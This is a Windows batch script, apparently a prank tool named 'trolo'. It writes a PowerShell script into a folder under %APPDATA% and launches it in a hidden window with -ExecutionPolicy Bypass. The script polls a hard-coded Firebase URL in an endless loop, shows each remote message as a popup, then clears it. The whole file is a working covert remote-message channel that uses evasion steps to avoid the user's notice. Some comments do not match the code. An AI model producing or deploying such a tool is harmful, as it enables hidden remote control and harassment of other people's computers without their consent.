@echo off
setlocal

:: Define the folder path and PowerShell script path
set "folderPath=%APPDATA%\TroloFolder"
set "ps1File=%folderPath%\trolo.ps1"

:: Check if the folder exists, create it if not
if not exist "%folderPath%" (
    mkdir "%folderPath%"
)

:: Write the PowerShell script to the ps1 file
echo # Firebase URL > "%ps1File%"
echo $firebaseUrl = "https://trolo-1252e-default-rtdb.firebaseio.com/main.json" >> "%ps1File%"
echo. >> "%ps1File%"
echo # Function to check WiFi connectivity >> "%ps1File%"
echo function Check-WiFi { >> "%ps1File%"
echo     $networkStatus = Get-NetAdapter ^| Where-Object { $_.Status -eq "Up" } >> "%ps1File%"
echo     return ($networkStatus -ne $null) >> "%ps1File%"
echo } >> "%ps1File%"
echo. >> "%ps1File%"
echo # Infinite loop to keep the script running >> "%ps1File%"
echo while ($true) { >> "%ps1File%"
echo     try { >> "%ps1File%"
echo         # Check if WiFi is available >> "%ps1File%"
echo         if (Check-WiFi) { >> "%ps1File%"
echo             # Fetch the latest message >> "%ps1File%"
echo             $response = Invoke-RestMethod -Uri $firebaseUrl -Method Get >> "%ps1File%"
echo. >> "%ps1File%"
echo             # If there's a message that isn't empty, display it as a popup >> "%ps1File%"
echo             if ($response.message -ne "") { >> "%ps1File%"
echo                 Add-Type -AssemblyName PresentationFramework >> "%ps1File%"
echo                 [System.Windows.MessageBox]::Show($response.message, "M", 0, "Information") >> "%ps1File%"
echo. >> "%ps1File%"
echo                 # Reset the message to an empty string after showing the popup >> "%ps1File%"
echo                 $emptyPayload = @{ message = "" } ^| ConvertTo-Json -Depth 1 >> "%ps1File%"
echo                 Invoke-RestMethod -Uri $firebaseUrl -Method Patch -Body $emptyPayload -ContentType "application/json" >> "%ps1File%"
echo             } >> "%ps1File%"
echo         } >> "%ps1File%"
echo     } catch { >> "%ps1File%"
echo         # Handle any errors quietly >> "%ps1File%"
echo         Write-Host "Error polling Firebase or WiFi unavailable: $_" >> "%ps1File%"
echo     } >> "%ps1File%"
echo. >> "%ps1File%"
echo     # Wait 10 seconds before polling again >> "%ps1File%"
echo     Start-Sleep -Seconds 1 >> "%ps1File%"
echo } >> "%ps1File%"

:: Run the PowerShell script
powershell -WindowStyle hidden -ExecutionPolicy Bypass -File "%ps1File%"

endlocal
